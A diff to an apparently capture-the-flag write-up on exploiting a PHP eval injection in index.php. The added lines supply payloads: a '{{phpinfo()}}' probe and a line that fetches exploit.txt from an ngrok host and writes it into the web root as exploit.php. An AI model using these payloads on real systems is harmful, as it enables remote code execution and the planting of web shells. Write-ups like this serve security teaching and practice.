@@ -22,13 +22,13 @@ Snipped code from: index.php (Only PHP Part !)
 ![code](https://user-images.githubusercontent.com/84577967/174141852-b43da8d4-6069-43a4-a93f-406eb0b44b37.png)
 
 In the 7th line we have an eval inside a function `do_calcs` that has been called in the line 17 ! 
-But first we have to check the 4th line where we have the regex pattern so our php code must be inside 
+But first we have to check the 4th line where we have the regex pattern so our php code must be inside `{{PHP EVAL CODE}}`
 
 ![code](https://user-images.githubusercontent.com/84577967/174358220-78ffee4d-d1ee-49f5-a2c8-4b474068e8b5.png)
 
 # Solution
 
-Let's try to send a simple payload
+Let's try to send a simple payload `200,{{phpinfo()}}`
 
 ![phpinfo](https://user-images.githubusercontent.com/84577967/174358466-4c209820-f9e6-48ca-892a-030d8d922abf.png)
 
@@ -58,6 +58,10 @@ The shell.sh content:
 ```
 
 Great! Now let's host it on our local webserver using PHP or Python 
+
+```
+200,{{file_put_contents("/var/www/html/exploit.php",file_get_contents("http://XXXXXXXXX.ngrok.io/exploit.txt"),FILE_APPEND)}}
+```
 
 ![payload](https://user-images.githubusercontent.com/84577967/174358048-7ea473ea-06b6-407b-9f1e-e89ff5b433ad.png)
 
